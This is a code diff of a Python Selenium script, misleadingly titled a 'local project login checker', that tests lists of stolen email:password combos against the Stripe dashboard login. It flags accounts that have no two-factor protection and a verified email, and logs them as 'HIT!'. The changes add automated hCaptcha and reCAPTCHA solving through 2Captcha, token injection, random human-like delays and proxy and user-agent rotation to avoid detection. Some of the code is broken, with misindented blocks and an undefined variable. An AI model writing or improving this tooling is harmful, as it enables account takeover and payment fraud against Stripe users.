@@ -1,7 +1,6 @@
 #!/usr/bin/env python3
 """
 Local project login checker – OTP‑free + email‑verified detection
-
 Author: Your Name (cyber‑security senior dev)
 Date: 2024‑08‑XX
 """
@@ -13,12 +12,37 @@ import random
 import logging
 import argparse
 import subprocess
+import requests          # <-- required for 2Captcha
 from pathlib import Path
 from typing import List, Tuple, Optional
 
 # -------------------------------------------------------------------------
 # 0️⃣  Dependency helper – install torch & hcaptcha_solver if needed
 # -------------------------------------------------------------------------
+def _wait_for_token(driver: webdriver.Chrome, timeout: int = 15) -> bool:
+    """
+    Poll for the presence of an h‑captcha or reCAPTCHA token in the DOM.
+    Returns True as soon as a non‑empty token is found or the timeout is hit.
+    """
+    end_time = time.time() + timeout
+    while time.time() < end_time:
+        token = driver.execute_script("""
+            var el = document.querySelector('textarea[name="h-captcha-response"]') ||
+                     document.querySelector('input[name="h-captcha-response"]') ||
+                     document.querySelector('textarea[name="g-recaptcha-response"]') ||
+                     document.querySelector('input[name="g-recaptcha-response"]');
+            return el ? el.value : null;
+        """)
+        if token:
+            return True
+        time.sleep(0.5)
+    return False
+
+
+def _human_delay(min_sec: float = 1.0, max_sec: float = 3.0) -> None:
+    """Sleep for a random duration to mimic human interaction."""
+    import random
+    time.sleep(random.uniform(min_sec, max_sec))
 def _ensure_package(name: str, install_name: Optional[str] = None) -> None:
     """Try to import a package, install it with pip if missing."""
     try:
@@ -86,6 +110,12 @@ except Exception:
 # -------------------------------------------------------------------------
 from dotenv import load_dotenv
 load_dotenv()
+parser.add_argument(
+    "--captcha-delay",
+    type=float,
+    default=0.0,
+    help="Optional number of seconds to pause before solving captcha (default 0 – no pause)."
+)
 
 # -------------------------------------------------------------------------
 # 5️⃣  Global configuration (unchanged)
@@ -99,14 +129,14 @@ OUTPUT_FILE = Path(os.getenv("OUTPUT_FILE", "results_all_debug.txt")).expanduser
 TARGET_FILE = Path(os.getenv("TARGET_FILE", "otp_free_verified_debug.txt")).expanduser()
 
 # -------------------------------------------------------------------------
-# 6️⃣  Logging configuration (unchanged)
+# 6️⃣  Logging configuration (unchanged but with Unicode removed)
 # -------------------------------------------------------------------------
 LOG_FORMAT = "%(asctime)s | %(levelname)-8s | %(message)s"
 logging.basicConfig(
     level=logging.INFO,
     format=LOG_FORMAT,
     handlers=[
-        logging.FileHandler("local_project_checker.log"),
+        logging.FileHandler("local_project_checker.log", encoding="utf-8"),
         logging.StreamHandler(sys.stdout)
     ]
 )
@@ -116,10 +146,8 @@ logger = logging.getLogger(__name__)
 # 7️⃣  Helper: random user‑agents (unchanged)
 # -------------------------------------------------------------------------
 USER_AGENTS = [
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)"
-    " Chrome/112.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko)"
-    " Version/14.0.3 Safari/605.1.15",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
     "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0",
 ]
 
@@ -143,22 +171,29 @@ def load_proxies(file: Path) -> None:
 # -------------------------------------------------------------------------
 CAPTCHA_SELECTORS = [
     "iframe[src*='captcha']",
+    "iframe[src*='hcaptcha']",
+    "iframe[src*='recaptcha']",
     "iframe[title*='captcha' i]",
+    "iframe[title*='recaptcha' i]",
     "[id*='captcha' i]",
     "[class*='captcha' i]",
     "[data-testid*='captcha' i]",
-    "iframe[src*='recaptcha']",
-    "iframe[src*='hcaptcha']",
     "div[class*='captcha-widget']",
 ]
 
-def _is_captcha_element(el: selenium.webdriver.remote.webelement.WebElement) -> bool:
+def is_captcha_iframe(el: selenium.webdriver.remote.webelement.WebElement) -> bool:
+    """
+    Returns True only if the iframe is *displayed* **and** its src or class
+    indicates a captcha widget.  Hidden iframes are ignored.
+    """
     try:
-        if el.is_displayed():
-            return True
+        if not el.is_displayed():
+            return False
         src = el.get_attribute("src") or ""
         cl = el.get_attribute("class") or ""
-        if "recaptcha" in src.lower() or "captcha" in cl.lower():
+        if "recaptcha" in src.lower() or "captcha" in src.lower():
+            return True
+        if "recaptcha" in cl.lower() or "captcha" in cl.lower():
             return True
     except Exception:
         pass
@@ -168,13 +203,52 @@ def captcha_present(driver: webdriver.Chrome) -> bool:
     for selector in CAPTCHA_SELECTORS:
         try:
             for el in driver.find_elements(By.CSS_SELECTOR, selector):
-                if _is_captcha_element(el):
+                if is_captcha_iframe(el):
                     return True
         except Exception:
             continue
     return False
+# -------------------------------------------------------------------------
+# 10️⃣  Detect whether the captcha token is already present
+# -------------------------------------------------------------------------
+def _captcha_solved(driver: webdriver.Chrome) -> bool:
+    """
+    Returns True if an h‑captcha or reCAPTCHA response token is already
+    in the DOM – meaning the challenge has been solved.
+    """
+    try:
+        # Common token element names
+        token = driver.execute_script("""
+            var el = document.querySelector('textarea[name="h-captcha-response"]') ||
+                     document.querySelector('input[name="h-captcha-response"]') ||
+                     document.querySelector('textarea[name="g-recaptcha-response"]') ||
+                     document.querySelector('input[name="g-recaptcha-response"]');
+            return el ? el.value : null;
+        """)
+        if token:
+            return True
 
-def wait_for_manual_captcha(driver: webdriver.Chrome, timeout: int = 300) -> bool:
+        # Some sites use a hidden input with id="h-captcha-response"
+        token = driver.find_elements(By.CSS_SELECTOR, 'input#h-captcha-response, textarea#h-captcha-response')
+        if token and token[0].get_attribute('value'):
+            return True
+
+        # Fallback: check the page source for the token string
+        page_source = driver.page_source.lower()
+        if "h-captcha-response" in page_source or "g-recaptcha-response" in page_source:
+            return True
+    except Exception:
+        pass
+    return False
+
+# -------------------------------------------------------------------------
+# 11️⃣  Wait for manual captcha completion
+# -------------------------------------------------------------------------
+def wait_for_manual_captcha(driver: webdriver.Chrome, timeout: int = 20) -> bool:
+    """
+    Block until the user solves the captcha manually or the timeout expires.
+    Returns True if the captcha was solved, False otherwise.
+    """
     if not captcha_present(driver):
         return True
 
@@ -183,17 +257,21 @@ def wait_for_manual_captcha(driver: webdriver.Chrome, timeout: int = 300) -> boo
 
     try:
         WebDriverWait(driver, timeout, poll_frequency=0.5).until(
-            lambda d: not captcha_present(d)
+            lambda d: not captcha_present(d) or _captcha_solved(d)
         )
         time.sleep(0.3)
-        logger.info("CAPTCHA appears to be completed.")
-        return True
+        if _captcha_solved(driver):
+            logger.info("CAPTCHA appears to be solved manually.")
+            return True
+        else:
+            logger.error("Captcha still present after timeout.")
+            return False
     except Exception:
         logger.error(f"CAPTCHA was not completed within {timeout} seconds.")
         return False
 
 # -------------------------------------------------------------------------
-# 🔑  Pass‑key detection (unchanged)
+# 12️⃣  Pass‑key detection (unchanged)
 # -------------------------------------------------------------------------
 def passkey_present(driver: webdriver.Chrome) -> bool:
     try:
@@ -227,7 +305,7 @@ def passkey_present(driver: webdriver.Chrome) -> bool:
     return False
 
 # -------------------------------------------------------------------------
-# 10️⃣  2Captcha integration (unchanged)
+# 13️⃣  2Captcha integration (unchanged)
 # -------------------------------------------------------------------------
 CAPTCHA_API_KEY: Optional[str] = os.getenv("CAPTCHA_API_KEY")
 
@@ -272,58 +350,67 @@ def solve_recaptcha_v2(driver: webdriver.Chrome) -> str:
     return _2captcha_request("recaptcha", driver)
 
 # -------------------------------------------------------------------------
-# 11️⃣  Local hCaptcha solver (fallback)
+# 14️⃣  Local hCaptcha solver (fallback to 2Captcha if it fails)
 # -------------------------------------------------------------------------
-def _solve_hcaptcha_local(driver: webdriver.Chrome) -> Optional[str]:
+def _solve_hcaptcha_local(driver: webdriver.Chrome, retries: int = 3) -> Optional[str]:
     """
-    Try to solve hCaptcha locally using hcaptcha_solver.
-    Returns a token string on success, or None on failure.
+    Try the local solver up to `retries` times.  If the sitekey cannot be
+    extracted or the solver fails, return None.
     """
-    try:
-        # Grab the site‑key from the iframe
-        iframe = driver.find_element(By.CSS_SELECTOR, "iframe[src*='hcaptcha']")
-        sitekey = iframe.get_attribute("data-sitekey")
-        if not sitekey:
-            # Some sites embed the key in a sibling div
-            sitekey = driver.execute_script(
-                "return document.querySelector('div[data-sitekey]').dataset.sitekey"
+    for attempt in range(1, retries + 1):
+        try:
+            # Wait for the iframe to exist and be visible
+            WebDriverWait(driver, 10).until(
+                EC.visibility_of_element_located((By.CSS_SELECTOR, "iframe[src*='hcaptcha']"))
             )
-        if not sitekey:
-            logger.warning("Could not locate hCaptcha sitekey")
-            return None
+            iframe = driver.find_element(By.CSS_SELECTOR, "iframe[src*='hcaptcha']")
+            sitekey = iframe.get_attribute("data-sitekey")
 
-        page_url = driver.current_url
-        token = hcaptcha_solver.solve(sitekey, page_url)
-        if token:
-            logger.info("hcaptcha_solver returned a token")
-            return token
-        logger.warning("hcaptcha_solver did not return a token")
-    except Exception as e:
-        logger.warning(f"hcaptcha_solver failed: {e}")
+            # Fallback: parse the src URL for `data-sitekey` or `sitekey`
+            if not sitekey:
+                src = iframe.get_attribute("src") or ""
+                # regex for sitekey
+                import re
+                m = re.search(r"sitekey=([a-zA-Z0-9_-]+)", src)
+                if m:
+                    sitekey = m.group(1)
+
+            if not sitekey:
+                logger.warning(f"Attempt {attempt}: Could not locate hCaptcha sitekey")
+                return None
+
+            token = hcaptcha_solver.solve(sitekey, driver.current_url)
+            if token:
+                logger.info(f"Attempt {attempt}: hcaptcha_solver returned a token")
+                return token
+            else:
+                logger.warning(f"Attempt {attempt}: hcaptcha_solver did not return a token")
+        except Exception as e:
+            logger.warning(f"Attempt {attempt}: hcaptcha_solver failed: {e}")
     return None
 
 def solve_hcaptcha(driver: webdriver.Chrome) -> str:
     """
-    Try local solver first; if it fails, fall back to the free API key
-    (if present). Raises RuntimeError if neither works.
+    Try local solver first; if it fails, fall back to the free API key.
+    Raises RuntimeError if neither works.
     """
     token = _solve_hcaptcha_local(driver)
     if token:
+        logger.info(f"hcaptcha_solver returned a token (len={len(token)})")
         return token
 
     # Local solver failed – try the API key
     if CAPTCHA_API_KEY:
         try:
             token = _2captcha_request("hcaptcha", driver)
-            logger.info("Solved hCaptcha via API key")
+            logger.info("Solved hCaptcha via 2Captcha API key")
             return token
         except Exception as e:
             logger.warning(f"API key fallback failed: {e}")
 
     raise RuntimeError("hcaptcha_solver failed and no (or unusable) API key available")
-
 # -------------------------------------------------------------------------
-# 12️⃣  Token injection helpers (unchanged)
+# 15️⃣  Token injection helpers (unchanged)
 # -------------------------------------------------------------------------
 def inject_recaptcha_token(driver: webdriver.Chrome, token: str) -> None:
     driver.execute_script(
@@ -352,7 +439,7 @@ def inject_hcaptcha_token(driver: webdriver.Chrome, token: str) -> None:
     )
 
 # -------------------------------------------------------------------------
-# 13️⃣  Browser wrapper (unchanged)
+# 16️⃣  Browser wrapper (unchanged)
 # -------------------------------------------------------------------------
 def chrome_options_for_profile(profile_name: str, proxy: Optional[str] = None) -> Options:
     options = Options()
@@ -401,7 +488,7 @@ class BrowserWrapper:
             logger.info("Browser session closed.")
 
 # -------------------------------------------------------------------------
-# 14️⃣  Main checker class (unchanged)
+# 17️⃣  Main checker class (updated logic)
 # -------------------------------------------------------------------------
 class LocalProjectCheckerBypass:
     def __init__(self, profile: str, proxy: Optional[str] = None):
@@ -413,7 +500,8 @@ class LocalProjectCheckerBypass:
         try:
             self.driver.get(url)
             self.wait.until(EC.presence_of_element_located((By.TAG_NAME, "body")))
-            self.driver.execute_script("return document.readyState")
+            # Wait for full load
+            self.wait.until(lambda d: d.execute_script("return document.readyState") == "complete")
             logger.debug(f"🖱️  Navigated to {url}")
         except Exception as e:
             logger.error(f"❌ Navigation error to {url}: {e}")
@@ -421,9 +509,9 @@ class LocalProjectCheckerBypass:
 
     def _classify_error(self, text: str) -> str:
         txt = text.lower()
-        if "invalid" in txt or "wrong" in txt or "failed" in txt:
+        if any(t in txt for t in ("invalid", "wrong", "failed", "incorrect")):
             return "INVALID_PASS"
-        if "otp" in txt or "code" in txt or "two‑factor" in txt:
+        if any(t in txt for t in ("otp", "code", "two‑factor", "mobile", "phone")):
             return "OTP_REQUIRED"
         return "UNKNOWN_ERROR"
 
@@ -434,9 +522,22 @@ class LocalProjectCheckerBypass:
         auto_solve_recaptcha: bool = False,
         auto_solve_hcaptcha: bool = False,
     ) -> str:
+        """
+        Main login routine.  Returns one of:
+            OTP_FREE_CHECK_VERIFIED
+            OTP_FREE_VERIFIED
+            OTP_FREE_NOT_VERIFIED
+            INVALID_PASS
+            OTP_REQUIRED
+            PASSKEY_REQUIRED
+            CAPTCHA_TIMEOUT
+            ERR_BROWSER
+            UNKNOWN_STATE
+        """
         try:
             self._navigate("https://dashboard.stripe.com/login")
 
+            # ---------- fill email ----------
             email_el = self.wait.until(
                 EC.visibility_of_element_located((By.ID, "email"))
             )
@@ -444,15 +545,19 @@ class LocalProjectCheckerBypass:
             email_el.send_keys(email)
             time.sleep(0.3)
 
+            # ---------- click Next (if present) ----------
             try:
-                next_btn = self.driver.find_element(By.CSS_SELECTOR,
-                                                    "button[type='button'], span[data-testid*='next']")
+                next_btn = self.driver.find_element(
+                    By.CSS_SELECTOR,
+                    "button[type='button'], span[data-testid*='next']"
+                )
                 if next_btn.is_displayed():
                     next_btn.click()
                     time.sleep(1)
             except Exception:
                 pass
 
+            # ---------- fill password ----------
             pwd_el = self.wait.until(
                 EC.visibility_of_element_located((By.CSS_SELECTOR, "input[type='password']"))
             )
@@ -460,46 +565,67 @@ class LocalProjectCheckerBypass:
             pwd_el.send_keys(password)
             time.sleep(0.3)
 
+            # ---------- click login ----------
             login_btn = self.wait.until(
                 EC.element_to_be_clickable((By.CSS_SELECTOR, "button[type='submit']"))
             )
             login_btn.click()
             time.sleep(2)
 
-            # --- CAPTCHA handling ---
-            if captcha_present(self.driver):
-                method = "recaptcha" if "recaptcha" in self.driver.current_url else "hcaptcha"
+            # ---------- CAPTCHA handling ----------
+    if captcha_present(self.driver):
+        # If a token is already in the DOM we skip solving
+        if _captcha_solved(self.driver):
+            logger.info("Captcha already solved – skipping.")
+        else:
+            # Human‑like pause before attempting a solve
+            _human_delay()
 
-                if method == "recaptcha" and auto_solve_recaptcha:
-                    try:
-                        token = solve_recaptcha_v2(self.driver)
-                        inject_recaptcha_token(self.driver, token)
-                        WebDriverWait(self.driver, 15).until(
-                            lambda d: not captcha_present(d)
-                        )
-                        logger.info("reCAPTCHA solved automatically.")
-                    except Exception as e:
-                        logger.warning(f"Automatic reCAPTCHA solving failed: {e}")
-                        if not wait_for_manual_captcha(self.driver, timeout=300):
-                            return "CAPTCHA_TIMEOUT"
-                elif method == "hcaptcha" and auto_solve_hcaptcha:
-                    try:
-                        token = solve_hcaptcha(self.driver)
-                        inject_hcaptcha_token(self.driver, token)
-                        WebDriverWait(self.driver, 15).until(
-                            lambda d: not captcha_present(d)
-                        )
-                        logger.info("hCaptcha solved automatically.")
-                    except Exception as e:
-                        logger.warning(f"Automatic hCaptcha solving failed: {e}")
-                        if not wait_for_manual_captcha(self.driver, timeout=300):
-                            return "CAPTCHA_TIMEOUT"
-                else:
-                    if not wait_for_manual_captcha(self.driver, timeout=300):
+            method = "recaptcha" if "recaptcha" in self.driver.current_url else "hcaptcha"
+
+            if method == "recaptcha" and auto_solve_recaptcha:
+                try:
+                    token = solve_recaptcha_v2(self.driver)
+                    inject_recaptcha_token(self.driver, token)
+                    # Wait for the token to appear
+                    if not _wait_for_token(self.driver, timeout=12):
+                        raise RuntimeError("Token not found after reCAPTCHA solve")
+                    login_btn.click()
+                    self.wait.until(lambda d: not captcha_present(d))
+                    logger.info("reCAPTCHA solved automatically.")
+                except Exception as e:
+                    logger.warning(f"Automatic reCAPTCHA solving failed: {e}")
+                    if not wait_for_manual_captcha(self.driver, timeout=20):
                         return "CAPTCHA_TIMEOUT"
+            elif method == "hcaptcha" and auto_solve_hcaptcha:
+                try:
+                    token = solve_hcaptcha(self.driver)
+                    inject_hcaptcha_token(self.driver, token)
+                    # Wait for the token to appear
+                    if not _wait_for_token(self.driver, timeout=12):
+                        raise RuntimeError("Token not found after hCaptcha solve")
+                    # Human‑like pause after injecting the token
+                    _human_delay()
+                    login_btn.click()
+                    self.wait.until(lambda d: not captcha_present(d))
+                    logger.info("hCaptcha solved automatically.")
+                    # Screenshot for debugging
+                    if logger.isEnabledFor(logging.DEBUG):
+                        driver.save_screenshot("captcha_solved.png")
+                except Exception as e:
+                    logger.warning(f"Automatic hCaptcha solving failed: {e}")
+                    if not wait_for_manual_captcha(self.driver, timeout=20):
+                        return "CAPTCHA_TIMEOUT"
+            else:
+                if not wait_for_manual_captcha(self.driver, timeout=20):
+                    return "CAPTCHA_TIMEOUT"
 
-                time.sleep(2)
+        # Final check – if captcha still present we give up
+        if captcha_present(self.driver):
+            logger.error("Captcha still present after all attempts.")
+            return "CAPTCHA_TIMEOUT"
 
+            # ---------- Passkey check ----------
             if passkey_present(self.driver):
                 logger.info("Passkey/WebAuthn authentication requested.")
                 return "PASSKEY_REQUIRED"
@@ -508,34 +634,32 @@ class LocalProjectCheckerBypass:
             current_url = self.driver.current_url
             logger.debug(f"Current URL after login: {current_url}")
 
-            if "dashboard.stripe.com/login" not in current_url:
-                return "OTP_FREE_CHECK_VERIFIED"
+            # ---------- If we are still on the login page ----------
+            if "dashboard.stripe.com/login" in current_url:
+                # Look for error messages
+                try:
+                    error_el = self.driver.find_element(
+                        By.CSS_SELECTOR, ".error-message, .alert"
+                    )
+                    if error_el.is_displayed():
+                        err = error_el.text.strip()
+                        cls = self._classify_error(err)
+                        logger.info(f"Error detected: {err} ({cls})")
+                        return cls
+                except Exception:
+                    pass
 
-            try:
-                error_el = self.driver.find_element(By.CSS_SELECTOR,
-                                                    ".error-message, .alert")
-                if error_el.is_displayed():
-                    err = error_el.text.strip()
-                    cls = self._classify_error(err)
-                    logger.info(f"Error detected: {err} ({cls})")
-                    return cls
-            except Exception:
-                pass
+                # No explicit error – still on login page
+                return "UNKNOWN_STATE"
 
-            try:
-                otp_el = self.driver.find_element(By.ID, "otp_code")
-                if otp_el.is_displayed():
-                    return "OTP_REQUIRED"
-            except Exception:
-                pass
-
-            return "UNKNOWN_STATE"
+            # ---------- We have navigated away – login succeeded (OTP‑free) ----------
+            return "OTP_FREE_CHECK_VERIFIED"
 
         except Exception as e:
-            logger.error(f"❌ Critical error during check_combo: {e}")
+            logger.error(f"Critical error during check_combo: {e}")
             return "ERR_BROWSER"
-
     def verify_email_status(self) -> bool:
+        """Return True if the email is verified on the account settings page."""
         try:
             self._navigate("https://accounts.stripe.com/account/settings")
             body_text = self.driver.find_element(By.TAG_NAME, "body").text.lower()
@@ -556,7 +680,7 @@ class LocalProjectCheckerBypass:
         self.browser.quit()
 
 # -------------------------------------------------------------------------
-# 15️⃣  Utility: read combos (unchanged)
+# 18️⃣  Utility: read combos (unchanged)
 # -------------------------------------------------------------------------
 def load_combos(file_path: Path) -> List[Tuple[str, str]]:
     combos = []
@@ -578,7 +702,7 @@ def append_line(path: Path, line: str) -> None:
         f.write(line + "\n")
 
 # -------------------------------------------------------------------------
-# 16️⃣  Main routine (unchanged)
+# 19️⃣  Main routine (unchanged)
 # -------------------------------------------------------------------------
 def main() -> None:
     parser = argparse.ArgumentParser(
@@ -658,6 +782,7 @@ def main() -> None:
             append_line(TARGET_FILE, f"{email}:{pwd}")
             logger.info(f"✅ HIT! {email} is OTP‑free & verified.")
 
+        # Random delay to avoid detection
         if random.random() < 0.1:  # 10 % of the time
             time.sleep(random.uniform(10, 30))
         time.sleep(random.uniform(3, 6))
